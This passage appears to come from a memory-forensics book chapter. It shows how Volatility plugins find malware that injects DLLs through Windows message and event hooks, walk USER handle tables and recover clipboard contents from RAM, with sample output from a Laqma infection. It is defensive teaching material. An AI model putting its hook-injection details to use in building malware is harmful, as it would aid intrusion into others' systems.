  'HF_HOOKFAULTED': 4, 'HF_WX86KNOWNDLL': 6, 'HF_HUNG': 3, 'HF_FREED': 9, 
  'HF_ANSI': 1, 'HF_GLOBAL': 0, 'HF_DESTROYED': 7}}]
0x44  : ihmod                          ['long']
0x48  : ptiHooked                      ['pointer64', ['tagTHREADINFO']]
0x50  : rpdesk                         ['pointer64', ['tagDESKTOP']]
0x58  : fLastHookHung                  ['BitField', {'end_bit': 8, 
  'start_bit': 7, 'native_type': 'long'}]
0x58  : nTimeout                       ['BitField', {'end_bit': 7, 
  'start_bit': 0, 'native_type': 'unsigned long'}]
```

## **Key Points**

The key points are these:

- `head`: The common header for USER objects and can help identify the owning process or thread. More information on this is available in the “User Handles” section.
- `phkNext`: A pointer to the next hook in the chain. When a hook procedure calls `CallNextHookEx`, the system locates the next hook using this member.
- `offPfn`: A relative virtual address (RVA) to the hook procedure. The procedure can be in the same module as the code calling `SetWindowsHookEx` (for local thread-specific hooks only), in which case `ihmod` is -1. Otherwise, for global hooks, the procedure is in a DLL, and `ihmod` is an index into an array of atoms located at `win32k!_aatomSysLoaded`. To determine the name of the DLL, you must translate the `ihmod` into an atom and then obtain the atom name (see Chapter 14).
- `ptiHooked`: This value can be used to identify the hooked thread.
- `rpdesk`: Identifies the desktop in which the hook is set. Hooks cannot cross desktop boundaries.

---

### Detecting Message Hooks for DLL Injection

The `messagehooks` plugin enumerates *global* hooks by finding all desktops and accessing `tagDESKTOP.pDeskInfo.aphkStart`—an array of `tagHOOK` structures whose positions in the array indicate which type of message is to be filtered (such as `WH_KEYBOARD` or `WH_MOUSE`). The `tagDESKTOP.pDeskInfo.fsHooks` value is used as a bitmap to tell you which positions in the array are actively in use. Likewise, for each thread, the plugin scans for *local* (i.e., thread-specific) hooks by looking at `tagTHREADINFO.aphkStart` and `tagTHREADINFO.fsHooks`.

[Figure 15-3](#figure15-3) shows a disassembly of the Laqma malware installing a `WM_GETMESSAGE` hook. This is an example of malware using `SetWindowsHookEx` as simply a means to load DLLs in other processes instead of monitoring or intercepting messages. You can tell because the `lpfnWndProc` just passes control to the next hook in the chain by calling `CallNextHookEx`. Also note that the `dwThreadId` parameter is 0, which means the hook is global and will affect all GUI threads in the same desktop as the executing malware.

Running the `messagehooks` plugin on a memory dump infected with Laqma shows results like the following:

```
$ python vol.py -f laqma.vmem --profile=WinXPSP3x86 messagehooks --output=block
Volatility Foundation Volatility Framework 2.4
Offset(V)  : 0xbc693988
Session    : 0
Desktop    : WinSta0\Default
Thread     : <any>
Filter     : WH_GETMESSAGE
Flags      : HF_ANSI, HF_GLOBAL
Procedure  : 0x1fd9
ihmod      : 1
Module     : C:\WINDOWS\system32\Dll.dll

Offset(V)  : 0xbc693988
Session    : 0
Desktop    : WinSta0\Default
Thread     : 1584 (explorer.exe 1624)
Filter     : WH_GETMESSAGE
Flags      : HF_ANSI, HF_GLOBAL
Procedure  : 0x1fd9
ihmod      : 1
Module     : C:\WINDOWS\system32\Dll.dll

Offset(V)  : 0xbc693988
Session    : 0
Desktop    : WinSta0\Default
Thread     : 252 (VMwareUser.exe 1768)
Filter     : WH_GETMESSAGE
Flags      : HF_ANSI, HF_GLOBAL
Procedure  : 0x1fd9
ihmod      : 1
Module     : C:\WINDOWS\system32\Dll.dll
[snip]
```

![c15f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f003.png)

*[**Figure 15-3:**](#figureanchor15-3) Laqma installs a message hook to inject Dll.dll into other processes*

As you can see, all the hooks are global because the flags include `HF_GLOBAL`. That means they are the direct result of calling `SetWindowsHookEx` with the `dwThreadId` parameter set to 0. Although not all global hooks are malicious, out of the malware samples we have seen that hook window messages, they all use global hooks.

The difference between the three hooks shown is that the first one is global and was gathered from the `tagDESKTOP` structure. You can tell because the target thread is `<any>`. It tells you that any GUI threads that run in the `WinSta0\Default` desktop are subject to monitoring by the malware. The next two hooks are associated with specific threads (as a result of the global hook) and have caused the injection of `Dll.dll` into `explorer.exe` and `VMwareUser.exe`.

From the disassembly in [Figure 15-3](#figure15-3), you already know that the `lpfnWndProc` has no special payload; this hook exists only to inject a DLL into other processes. However, do not overlook the fact that the `messagehooks` plugin shows you the address (as an RVA) of the hook procedure in the DLL. In the examples shown, you can find the hook procedure at `0x1fd9` from the base of `Dll.dll` in the affected processes. Thus, if you did not preemptively know the purpose of a hook, you can easily use `volshell` and switch into the target process’ context and then disassemble the function.

As shown in the following code, you can locate the base address (`0xac0000`) of the injected DLL inside `explorer.exe` using the `dlllist` plugin. Next, you can disassemble the code at offset `0x1fd9`. Notice that the function consists of only a few instructions, which essentially just pass its arguments, in unmodified form, to `CallNextHookEx`.

```
$ python vol.py -f laqma.vmem --profile=WinXPSP3x86 dlllist -p 1624 
      | grep Dll.dll
Volatility Foundation Volatility Framework 2.4
0x00ac0000     0x8000 C:\Documents and Settings\Mal Ware\Desktop\Dll.dll

$ python vol.py -f laqma.vmem --profile=WinXPSP3x86 volshell
Volatility Foundation Volatility Framework 2.4
Current context: process System, pid=4, ppid=0 DTB=0x31a000
Welcome to volshell! 
To get help, type 'hh()'
>>> cc(pid = 1624)
Current context: process explorer.exe, pid=1624, ppid=1592 DTB=0x80001c0
>>> dis(0x00ac0000 + 0x00001fd9)
0xac1fd9 ff74240c                     PUSH DWORD [ESP+0xc]
0xac1fdd ff74240c                     PUSH DWORD [ESP+0xc]
0xac1fe1 ff74240c                     PUSH DWORD [ESP+0xc]
0xac1fe5 ff350060ac00                 PUSH DWORD [0xac6000]
0xac1feb ff157c40ac00                 CALL DWORD [0xac407c] ; CallNextHookEx
0xac1ff1 c20c00                       RET 0xc
```

The final artifact you should note regarding the use of message hooks for DLL injection is that the full path on disk to the malicious DLL is added to an atom table. As previously described in Chapter 14, you can inspect the atom tables with the `atoms` or `atomscan` plugins. In the output that follows, you should recognize the `Dll.dll` string:

```
$ python vol.py –f laqma.vmem --profile=WinXPSP3x86 atoms 
Volatility Foundation Volatility Framework 2.4
AtomOfs(V)       Atom Refs   Pinned Name
---------- ---------- ------ ------ ----
0xc10e000d10     0xc001      1      1 USER32
0xe155e958     0xc002      1      1 ObjectLink
0xe100a308     0xc003      1      1 OwnerLink
0xc15e018c00     0xc004      1      1 Native
0xe1b2aa88     0xc1b2      2      0 __axelsvc
0xe4bcb888     0xc1be      2      0 ShImgVw:CPreview
0xe11b0250     0xc1c1      2      0 __srvmgr32
0xe1f8bc30     0xc1c3      1      0 C:\WINDOWS\system32\psbase.dll
0xe28ed818     0xc1c7      1      0 BCGP_TEXT
0xc29e050c98     0xc19f      1      0 ControlOfs01420000000000FC
0xe11d6290     0xc1a0      1      0 C:\WINDOWS\system32\Dll.dll
0xe1106380     0xc1a1      1      0 BCGM_ONCHANGE_ACTIVE_TAB
0xe11a5090     0xc1a2      1      0 ControlOfs01EE0000000003C8
[snip]
```

---

**NOTE**

Not all DLL paths in the atom table are related to message hooks. Applications can put strings in the atom table for a number of reasons. For instance, `psbase.dll` appears right above `Dll.dll`, but `psbase.dll` is a legitimate component of Windows.

---

## User Handles

USER handles are references to objects in the GUI subsystem. Just as `CreateFile` returns a `HANDLE` to a `_FILE_OBJECT` managed by the NT executive object manager, `CreateWindow` returns an `HWND` (handle to a `tagWND)` that is managed by the GUI subsystem. There are either 20 (Windows XP through Vista) or 22 (Windows 7) types of USER objects, including `TYPE_FREE`.

From a malware and forensics perspective, the USER handle tables are extremely valuable because they provide an alternate method of finding evidence. For example, we already discussed how to find windows and hooks, but you can find the same objects by walking the USER handle table. Thus if an attacker tries to get creative and hide objects using DKOM, they must hide in two ways rather than one in order to be effective. Also, the USER handle tables can serve as a primary way of finding objects that you do not locate in other ways, such as event hooks and clipboard data.

---

**NOTE**

You may remember from Chapter 6 that each process’ `_EPROCESS.ObjectTable` points to a process-specific handle table of executive objects (files, registry keys, mutexes, etc.). The GUI subsystem is different: You have one USER handle table per session and all processes in the session share it. *That does not mean that you can access all objects in the USER handle table from any process*. As you will soon see, the system stores metadata with each handle to dictate which process or thread is the owner.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Programmable API**: You can leverage the USER handle table’s API within Volatility to build plugins that analyze certain types of USER objects. This is how the `eventhooks` and `clipboard` plugins currently work.
- **Verification or cross-reference**: Malware may use rootkit techniques to hide handles to objects in various ways, but you can always check the USER handle table for an authoritative view of what resources are available. The USER handle table can also be manipulated, given administrator access and knowledge of the mostly undocumented underlying kernel data structures.

## **Data Structures**

Various structures are involved in the handle table. First, the `win32k!_gahti` symbol is an array of `tagHANDLETYPEINFO` structures—one for each object type. These structures are similar in concept to `nt!_OBJECT_TYPE` for executive objects. In particular, the handle type information structures tell you what pool tags are associated with each object type; whether the objects are allocated from the desktop heap, shared heap, or session pool; and whether the object is thread-owned or process-owned.

The structure for Windows 7 x64 is shown in the following code:

```
>>> dt("tagHANDLETYPEINFO")
'tagHANDLETYPEINFO' (16 bytes)
0x0   : fnDestroy                      ['pointer', ['void']]
0x8   : dwAllocTag                     ['String', {'length': 4}]
0xc   : bObjectCreateFlags             ['Flags', {'target': 'unsigned char', 
   'bitmap': {'OCF_VARIABLESIZE': 7, 'OCF_DESKTOPHEAP': 4, 
   'OCF_THREADOWNED': 0, 'OCF_SHAREDHEAP': 6, 'OCF_USEPOOLIFNODESKTOP': 5, 
   'OCF_USEPOOLQUOTA': 3, 'OCF_MARKPROCESS': 2, 'OCF_PROCESSOWNED': 1}}
```

## **Key Points**

The key points are these:

- `fnDestroy`: Points to the default deallocation/cleanup function for the object type.
- `dwAllocTag`: This value is similar to a pool tag; it consists of four ASCII characters that directly precede objects in memory, so you can use it to find or identify the allocations.
- `bObjectCreateFlags`: Flags that tell you whether an object is thread-owned or process-owned, whether it is allocated from the shared or desktop heaps, and so on.

---

### Enumerating USER Object Types

Take a quick look at the output of the `gahti` plugin on an x64 Windows 7 system. This plugin finds and parses the `win32k!_gahti` (gahti stands for *global array of handle table information*) to show you what types of objects you can expect to find on your target operating system.

The first entry in the gahti is always for `TYPE_FREE`, whose members are all 0. Once a handle is no longer in use, it is not immediately removed from the handle table. Instead, its type is simply set to `TYPE_FREE`, which gives you the opportunity to potentially recover information on previously used handles.

```
$ python vol.py -f win7x64cmd.dd --profile=Win7SP1x64 gahti
Volatility Foundation Volatility Framework 2.4
Session  Type                 Tag      fnDestroy          Flags
-------- -------------------- -------- ------------------ -----
       0 TYPE_FREE                     0x0000000000000000 
       0 TYPE_WINDOW          Uswd     0xfffff9600014f660 OCF_DESKTOPHEAP, 
OCF_THREADOWNED, OCF_USEPOOLIFNODESKTOP, OCF_USEPOOLQUOTA
       0 TYPE_MENU                     0xfffff960001515ac OCF_DESKTOPHEAP, 
OCF_PROCESSOWNED
       0 TYPE_CURSOR          Uscu     0xfffff960001541a0 OCF_MARKPROCESS, 
OCF_PROCESSOWNED, OCF_USEPOOLQUOTA
       0 TYPE_SETWINDOWPOS    Ussw     0xfffff960001192b4 OCF_THREADOWNED, 
OCF_USEPOOLQUOTA
       0 TYPE_HOOK                     0xfffff9600018e5c8 OCF_DESKTOPHEAP, 
OCF_THREADOWNED
       0 TYPE_CLIPDATA        Uscb     0xfffff9600017c5ac 
[snip]
       0 TYPE_WINEVENTHOOK    Uswe     0xfffff9600018f148 OCF_THREADOWNED
       0 TYPE_TIMER           Ustm     0xfffff960001046dc OCF_PROCESSOWNED
       0 TYPE_INPUTCONTEXT    Usim     0xfffff9600014c660 OCF_DESKTOPHEAP, 
OCF_THREADOWNED
       0 TYPE_HIDDATA         Usha     0xfffff960001d2a34 OCF_THREADOWNED
       0 TYPE_DEVICEINFO      UsDI     0xfffff960000d8cd4 
       0 TYPE_TOUCH           Ustz     0xfffff9600017c5cc OCF_THREADOWNED
       0 TYPE_GESTURE         Usgi     0xfffff9600017c5cc OCF_THREADOWNED
```

The `TYPE_WINDOW` objects are thread-owned; they are allocated from the desktop heap (or failing that, the session pool), and the individual allocations are tagged with the “`Usdw`” bytes.

`TYPE_TIMER` objects are process-owned. `TYPE_CLIPDATA` objects are neither thread- nor process-owned, which makes sense because data copied to the clipboard is freely accessible by any process in the session that calls `GetClipboardData`.

### The Shared Info Structure

Although you can indeed use the previously mentioned `dwAllocTag` to locate USER objects in RAM, there is a more authoritative method that has less potential to yield false positives. In particular, the `win32k!_gSharedInfo` symbol points to a `tagSHAREDINFO` structure, which in turn identifies the location of the session’s USER handle table—a map to all USER objects in use on the system. By finding objects through their references in the handle table, you know they are (or recently were) USER objects, in contrast with simply scanning through RAM looking for the 4-byte tags.

Finding the `win32k!_gSharedInfo` symbol accurately and reliably across all Windows versions can be difficult, especially without the use of PDB files. One thing you know, however, is that the symbol is somewhere in the `win32k.sys` kernel module. Already that clue narrows your search down to 3–5MB. Then do a little digging; open `win32k.sys` in IDA Pro and use the Names pane to locate `_gSharedInfo`. As shown in [Figure 15-4](#figure15-4), the symbol exists in the data section of the PE file. Depending on the build of the `win32k.sys` you’re analyzing, you can now narrow the search to about 100–150KB.

At this point, you can use some basic pattern matching to find the structure. Yet before you do that, you need to know a little bit more about the values you are trying to match. On a Windows 7 x64 system, the `tagSHAREDINFO` looks like this:

```
>>> dt("tagSHAREDINFO")
'tagSHAREDINFO' (568 bytes)
0x0   : psi                            ['pointer64', ['tagSERVERINFO']]
0x8   : aheList                        ['pointer64', ['_HANDLEENTRY']]
0x10  : HeEntrySize                    ['unsigned long']
0x18  : pDispInfo                      ['pointer64', ['tagDISPLAYINFO']]
0x20  : ulSharedDelta                  ['unsigned long long']
0x28  : awmControl                     ['array', 31, ['_WNDMSG']]
0x218 : DefWindowMsgs                  ['_WNDMSG']
0x228 : DefWindowSpecMsgs              ['_WNDMSG']
```

![c15f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f004.png)

*[**Figure 15-4:**](#figureanchor15-4) Analyzing win32k.sys in IDA Pro for clues on how to find the shared information structure*

---

## **Key Points**

The key points are these:

- `psi`: Points to a valid `tagSERVERINFO` structure.
- `aheList`: Points to an array of `_HANDLEENTRY` structures—one for each handle in the table. To determine the number of handles currently in use, you can look at `tagSHAREDINFO.psi.cHandleEntries`.
- `HeEntrySize`: The size of a `_HANDLEENTRY` for the current platform.
- `ulSharedDelta`: A delta that user-mode processes can use to determine the location of USER objects in kernel memory.

---

### Algorithm for Finding Shared Info

With the information you have gathered so far, it is possible to write code for Volatility that can, in fact, find this needle in a haystack. The procedure is as follows:

1. Determine the base address of `win32k.sys`as mapped into the session space.
2. Locate the data PE section. If the PE header is corrupt or paged (we have seen this happen in very busy, large memory systems), fall back to brute forcing the search using the 3–5MB full length of `win32k.sys` instead of just the data section.
3. Iterate over the data on a 4-byte boundary and instantiate a `tagSHAREDINFO` object at each address; then call the object’s `is_valid` method to perform the necessary sanity checks.

To see the Python code that corresponds to the described steps, look in the `volatility/plugins/gui/win32k_core.py` file. Now you should be able to find the `tagSHAREDINFO` structure on all versions of Windows without any problem.

---

**NOTE**

Tarjei Mandt’s *Windows Hook of Death: Kernel Attacks through Usermode Callbacks* ([http://mista.nu/blog/2011/08/11/windows-hooks-of-death-kernel-attacks-through-user-mode-callbacks/](http://mista.nu/blog/2011/08/11/windows-hooks-of-death-kernel-attacks-through-user-mode-callbacks/)) describes two additional ways of finding `tagSHAREDINFO`, which you might also find useful, depending on your context. For example, you can use `user32!_gSharedInfo` (an exported symbol available on Windows 7); or on a live system, you can call the `CsrClientConnectToServer` API function.

---

### Handle Table Entries

A handle table entry on Windows 7 x64 looks like this:

```
>>> dt("_HANDLEENTRY")
'_HANDLEENTRY' (24 bytes)
0x0   : phead                          ['pointer64', ['_HEAD']]
0x8   : pOwner                         ['pointer64', ['void']]
0x10  : bType                          ['Enumeration', {'target': 
  'unsigned char', 'choices': {0: 'TYPE_FREE', 1: 'TYPE_WINDOW', 
  2: 'TYPE_MENU', 3: 'TYPE_CURSOR', 4: 'TYPE_SETWINDOWPOS', 5: [snip]
0x11  : bFlags                         ['unsigned char']
0x12  : wUniq                          ['unsigned short']
```

All USER objects start with one of the common headers, which are pointed to by the `_HANDLEENTRY.phead` member. The `bType` tells you what type of object the handle is for, and based on the information previously dumped from `win32k!_gahti`, you know which objects are thread-owned and which are process-owned. The ones owned by a thread begin with `_THRDESKHEAD`, and those owned by a process begin with `_PROCDESKHEAD`. Objects such as `TYPE_CLIPBOARD` begin with the generic `_HEAD`. Here are the three possibilities:

```
>>> dt("_HEAD")
'_HEAD' (16 bytes)
0x0   : h                              ['pointer64', ['void']]
0x8   : cLockObj                       ['unsigned long']
>>> dt("_THRDESKHEAD")
'_THRDESKHEAD' (40 bytes)
0x0   : h                              ['pointer64', ['void']]
0x8   : cLockObj                       ['unsigned long']
0x10  : pti                            ['pointer64', ['tagTHREADINFO']]
0x18  : rpdesk                         ['pointer64', ['tagDESKTOP']]
0x20  : pSelf                          ['pointer64', ['unsigned char']]
>>> dt("_PROCDESKHEAD")
'_PROCDESKHEAD' (40 bytes)
0x0   : h                              ['pointer64', ['void']]
0x8   : cLockObj                       ['unsigned long']
0x10  : hTaskWow                       ['unsigned long']
0x18  : rpdesk                         ['pointer64', ['tagDESKTOP']]
0x20  : pSelf                          ['pointer64', ['unsigned char']]
```

If an object in the handle table is thread-owned, you can identify the object’s specific owning thread by referencing `_THRDESKHEAD.pti.pEThread`, which points to the executive `_ETHREAD` structure. On the other hand, if an object is process-owned, the `_HANDLEENTRY.pOwner` field is a pointer to the owning `tagPROCESSINFO`. From there, `tagPROCESSINFO.Process` identifies the executive `_EPROCESS` structure.

Now, regardless of the situation, you can always track USER objects back to their owning thread or process.

### Enumerating a Session’s USER Handles

The `userhandles` plugin locates the shared information structure for each session, walks the handle table, and prints out the contents:

```
$ python vol.py -f win7x64.dd --profile=Win7SP1x64 userhandles
Volatility Foundation Volatility Framework 2.4
**************************************************
SharedInfo: 0xffffc96c00f005d300, SessionId: 0 
aheList: 0xfffff900c0400000, Table size: 0x2000, Entry size: 0x18

Object(V)                Handle bType          Flags    Thread  Process
------------------ ------------ --------------- -------- -------- -------
0xfffff900c05824b0      0x10001 TYPE_MONITOR     0     -------- -
0xfffff900c01bad20      0x10002 TYPE_WINDOW      64      432    316
0xfffff900c00b6730      0x10003 TYPE_CURSOR      0     -------- 316
0xfffff900c0390b90      0x10004 TYPE_WINDOW      0       432    316
0xfffff900c00d7ab0      0x10005 TYPE_CURSOR      0     -------- 316
0xfffff900c0390e60      0x10006 TYPE_WINDOW      0       432    316
0xfffff900c00d7640      0x10007 TYPE_CURSOR      0     -------- 316
[snip]
0xfffff900c0630bf0   0x467c054b TYPE_HOOK        0       2368   2348
0xfffff900c0616d60     0x72055f TYPE_MENU        0     -------- 880
0xfffff900c0654610   0x494c0581 TYPE_MENU        0     -------- 880
0xfffff900c1a14b10   0x539c05f083 TYPE_CURSOR      0     -------- 880
[snip]
```

This plugin has three additional command-line arguments:

```
$ python vol.py userhandles –-help
[snip]
  -p PID, --pid=PID     Pid filter
  -t TYPE, --type=TYPE  Handle type
  -F, --free            Include free handles
```

To show only USER objects owned by a particular process, use the `--pid=PID` option. To filter by object type, use something similar to the following: `--type=TYPE_HOOK`. Finally, if you want to include information on handles marked as freed, use `--free`. You may be interested in freed objects if you are searching for evidence of events that occurred in the recent past.

Although the output of this plugin is not very verbose, it gives you an overview of the types of objects that a particular thread or process uses. Furthermore, you can leverage it as an API for other plugins, such as `eventhooks` and `clipboard`, which are discussed next.

## Event Hooks

Applications can use event hooks to receive notification when certain UI-related events occur. For example, Windows Explorer fires events when sounds play (`EVENT_SYSTEM_SOUND`); when a scroll operation begins (`EVENT_SYSTEM_SCROLLSTART`); or when an item in a menu bar, such as the Start menu, is selected (`EVENT_SYSTEM_MENUSTART`). If a client application wants to display a small speaker icon in the system tray when a sound is emitted, they can synchronize the behavior by installing an event hook that listens for `EVENT_SYSTEM_SOUND`.

Similar to message hooks (see Chapter 14), you can use event hooks to generically load a DLL into any processes that fire events, such as `explorer.exe`. This is a quick and effective way to execute code in the context of a remote process. The low-level internals and data structures are undocumented, which explains why you don’t have many tools, much less forensic tools, to analyze installed event hooks.

---

## **Analysis Objectives**

Your objectives are these:

- **Determine event hook scope**: You can inspect RAM for artifacts created during event hook installation. They will tell you which processes and threads are affected, as well as the specific events being monitored.
- **Analyze intent**: By disassembling the event hook function code, you can figure out exactly why the hooks were being used.

## **Data Structures**

The data structure for event hooks is `tagEVENTHOOK`. Microsoft does not document this internal structure, so the fields and offsets were determined through reverse engineering.

```
>>> dt("tagEVENTHOOK")
'tagEVENTHOOK' (None bytes)
0x18  : phkNext             ['pointer', ['tagEVENTHOOK']]
0x20  : eventMin            ['Enumeration', {'target': 'unsigned long', 
  'choices': {1: 'EVENT_MIN', 2: 'EVENT_SYSTEM_ALERT', [snip]
0x24  : eventMax            ['Enumeration', {'target': 'unsigned long', 
  'choices': {1: 'EVENT_MIN', 2: 'EVENT_SYSTEM_ALERT', [snip]
0x28  : dwFlags             ['unsigned long']
0x2c  : idProcess           ['unsigned long']
0x30  : idThread            ['unsigned long']
0x40  : offPfn              ['unsigned long long']
0x48  : ihmod               ['long']
```

Event hooks are installed by calling `SetWinEventHook`. As you can see from the function prototype that follows, most of the parameters are named the same as the underlying data structures in kernel mode.

```
HWINEVENTHOOK WINAPI SetWinEventHook(
  _In_  UINT eventMin,
  _In_  UINT eventMax,
  _In_  HMODULE hmodWinEventProc,
  _In_  WINEVENTPROC lpfnWinEventProc,
  _In_  DWORD idProcess,
  _In_  DWORD idThread,
  _In_  UINT dwflags
);
```

To hook all event types, applications can specify `EVENT_MIN` and `EVENT_MAX` as the `eventMin` and `eventMax` parameters, respectively. Malware that leverages event hooks as simply a means to inject DLLs into processes often use this pairing because they do not care which specific events are being generated.

## **Key Points**

The key points are these:

- `phkNext`: The next hook in the chain.
- `eventMin`: The lowest system event that the hook applies to.
- `eventMax`: The highest system event that the hook applies to.
- `dwFlags`: Tells you if the process generating the event will load the DLL containing the event hook procedure into its address space (`WINEVENT_INCONTEXT`). It also tells you if the thread installing the hook wants to be exempt from the hook (`WINEVENT_SKIPOWNPROCESS` and `WINEVENT_SKIPOWNTHREAD`).
- `idProcess`: The process ID (PID) of the target process, or 0 for all processes in the desktop.
- `idThread`: The thread ID (TID) of the target thread, or 0 for all threads in the desktop.
- `offPfn`: An RVA to the hook procedure in the DLL.
- `ihmod`: An index into the `win32k!_aatomSysLoaded` array, which you can use to identify the full path to the DLL containing the hook procedure.

---

Now you can view the full `eventhooks` output for this Windows 7 x64 system:

```
$ python vol.py -f  win7x64.dd --profile=Win7SP1x64 eventhooks
Volatility Foundation Volatility Framework 2.4

Handle: 0x300cb, Object: 0xfffff900c01eda10, Session: 1
Type: TYPE_WINEVENTHOOK, Flags: 0, Thread: 1516, Process: 880
eventMin: 0x4 EVENT_SYSTEM_MENUSTART
eventMax: 0x7 EVENT_SYSTEM_MENUPOPUPEND
Flags: , offPfn: 0xff567cc4, idProcess: 0, idThread: 0
ihmod: -1
```

One event hook is installed by a thread of `explorer.exe` PID 880. The types of events being filtered include menu start and stop operations. Because `ihmod` is -1 for the hook, you know that the `offPfn` hook procedure is located in `explorer.exe`, not in an external DLL. So this hook is probably not malicious. If the hooks were malicious, it would look very similar to the message hooks described earlier in the chapter: It would be global, and the hook procedure would be inside an attacker-provided DLL.

## Windows Clipboard

Determining what’s in a computer’s clipboard can be a valuable resource. For example, in one scenario, we traced a Remote Desktop Protocol (RDP) user’s actions by dumping his command history and seeing him start an outgoing FTP transaction from the victim computer. We could see the FTP server address and the user’s login name, but not the password. In this case, the attacker copied the password to his clipboard and pasted it over the RDP channel. Using both the command history and clipboard extraction plugins, we recovered the full set of credentials from RAM.

---

## **Analysis Objectives**

Your objectives are these:

- **Password recovery**: You can extract the contents of clipboard data from RAM, which in some cases can contain sensitive information such as passwords, usernames, and so on.
- **Copied files artifacts**: Attackers often exfiltrate files from victim systems to their remote drop sites. They can accomplish this by using basic copy and paste from Windows Explorer into an FTP directory—in which case the full path to the source file copies into the clipboard.

## **Data Structures**

The two critical structures for understanding clipboard objects are `tagCLIP` and `tagCLIPDATA`. The `tagCLIP` structure is defined in Windows 7 PDB files; however, `tagCLIPDATA` is not divulged at all.

In the earlier section on window stations, you learned that `tagWINDOWSTATION.pClipBase` points to an array of `tagCLIP` structures. The `tagCLIP` specifies the clipboard format and contains a handle to an associated `tagCLIPDATA`. You must separately obtain the actual address of the `tagCLIPDATA` object and then match it with the handle value. The easiest way to locate all `tagCLIPDATA` objects is to walk the session handle tables and filter for `TYPE_CLIPDATA`.

Here is how the structures appear on Windows 7 x64:

```
>>> dt("tagCLIP")
'tagCLIP' (24 bytes)
0x0   : fmt                            ['Enumeration', {'target': 'unsigned long', 'choices': {128: 'CF_OWNERDISPLAY', 1: 'CF_TEXT', 2: 'CF_BITMAP', 3: 'CF_METAFILEPICT', 4: 'CF_SYLK', 5: 'CF_DIF', 6: 'CF_TIFF', 7: 'CF_OEMTEXT', 8: 'CF_DIB', 9: 'CF_PALETTE', 10: 'CF_PENDATA', 11: 'CF_RIFF', 12: 'CF_WAVE', 13: 'CF_UNICODETEXT', 14: 'CF_ENHMETAFILE', 15: 'CF_HDROP', 16: 'CF_LOCALE', 17: 'CF_DIBV5', 131: 'CF_DSPMETAFILEPICT', 129: 'CF_DSPTEXT', 130: 'CF_DSPBITMAP', 142: 'CF_DSPENHMETAFILE'}}]
0x8   : hData                          ['pointer64', ['void']]
0x10  : fGlobalHandle                  ['long']

>>> dt("tagCLIPDATA")
’tagCLIPDATA’ (None bytes)
0x10  : cbData                         ['unsigned int']
0x14  : abData                         ['array', <function <lambda> at 0x1048c55e000>, ['unsigned char']]
```

## **Key Points**

The key points are these:

- `fmt`: Specifies the clipboard format. Although the enumeration includes only standard formats, applications can create their own with `RegisterClipboardFormat`. You can only expect formats with “TEXT” in the name to contain printable characters.
- `hData`: A handle value for the associated `tagCLIPDATA` object. This value can also be 1 for `DUMMY_TEXT_HANDLE`, 2 for `DUMMY_DIB_HANDLE`, or 0 for certain deferred operations, as described in *How the Clipboard Works* ([http://blogs.msdn.com/b/ntdebugging/archive/2012/03/16/how-the-clipboard-works-part-1.aspx](http://blogs.msdn.com/b/ntdebugging/archive/2012/03/16/how-the-clipboard-works-part-1.aspx)).
- `abData`: An array of bytes (length `cbData`) that contains the actual clipboard data. It can be text or binary, depending on the format.

---

### Algorithm for Clipboard Extraction

At the Digital Forensics Research Conference (DFRWS) 2011, Okolica and Peterson ([http://www.dfrws.org/2011/proceedings/18-350.pdf](http://www.dfrws.org/2011/proceedings/18-350.pdf)) were first to present a technique for extracting clipboard contents from RAM using a tool called the Compiled Memory Analysis Tool (CMAT). They discussed methods to find the data from user- and kernel-mode by using PDB files from Microsoft’s symbol server to resolve `user32!gphn` and `win32k!gSharedInfo`, respectively.

The way Volatility’s plugin works is similar yet quite different at the same time. Here is a brief description of the steps:

1. Enumerate all unique `_MM_SESSION_SPACE` structures.
2. Find the `tagSHAREDINFO` for each session and walk the USER handle table, collecting all `TYPE_CLIPDATA` objects.
3. Scan RAM for window station objects and enumerate the `tagCLIP` structures from `tagWINDOWSTATION.pClipBase`.
4. Associate the `tagCLIP.hData` handle values with their corresponding `tagCLIPDATA`.
5. At the end, cycle through any remaining `tagCLIPDATA` objects found via the USER handle table that were not already associated with a `tagCLIP`. This allows you to still report clipboard data even if the window station object is not found.

### Recovering Text from the Clipboard

One of the publicly accessible memory images known to have data in the clipboard at the time of the acquisition is `dfrws2008-rodeo-memory.img`. In the code that follows, you can see the output of the plugin on this image:

```
$ python vol.py -f dfrws2008-rodeo-memory.img --profile=WinXPSP2x86 clipboard
Volatility Foundation Volatility Framework 2.4
Session WindowStation Format               Handle Object     Data
------- ------------- ---------------- ---------- ---------- ------------
   0    WinSta0       CF_UNICODETEXT     0x4900c3 0xe12a7c98 pp -B -p -o out.pl file 
   0    WinSta0       CF_LOCALE           0x80043 0xe12362d0     
   0    WinSta0       CF_TEXT                 0x1 ----------     
   0    WinSta0       CF_OEMTEXT              0x1 ----------
```

As you can see, a user in session `0\WinSta0` placed a Unicode string `pp –B –p –o out.pl file` into the clipboard. This seems to be part of a command that runs a Perl script.

The `CF_LOCALE` format is not shown because it is binary, but you can view a hex dump by passing `-v/--verbose` to the plugin. There is also no data shown for `CF_TEXT` or `CF_OEMTEXT` because the handle value is 1 (`DUMMY_TEXT_HANDLE`).

### Recovering Binary Data from the Clipboard

In the following example, Microsoft Word and Microsoft Paint were opened. A small sketch was created in Paint, copied to the clipboard, and then pasted into Word. You can see the various private Object Linking and Embedding (OLE) formats created by Word (see the previously referenced paper by Okolica and Peterson for more information on private formats). Additionally, there are new `CF_METAFILEPICT`, `CF_ENHMETAFILE`, `CF_BITMAP`, and `CF_DIBV5` formats to support the binary images in the clipboard. Data is not shown because it is binary, but with a small amount of work, the images could be carved from memory and saved for viewing on an analysis system.

---

**NOTE**

You have alternate ways to recover images from RAM, including carving over the physical file with tools such as foremost or scalpel, or using the `dumpfiles` Volatility plugin. Here, the point is to identify specific images as the ones in the clipboard.

---

```
$ python vol.py -f image_clip.vmem --profile=Win7SP1x86 clipboard 
Volatility Foundation Volatility Framework 2.4
Session  WindowStation Format                 Handle Object     
-------- ------------- ------------------ ---------- ---------- 
     1   WinSta0       0xc009              0x3a2043b 0xfd91a160 
     1   WinSta0       0xc00b                    0x0 ---------- 
     1   WinSta0       0xc004                    0x0 ---------- 
     1   WinSta0       0xc003                    0x0 ---------- 
     1   WinSta0       0xc00e                    0x0 ---------- 
     1   WinSta0       CF_METAFILEPICT           0x0 ---------- 
     1   WinSta0       CF_DIB              0x20d04cf 0xfe1a0000 
     1   WinSta0       0xc013               0xb202c7 0xfe4d9650 
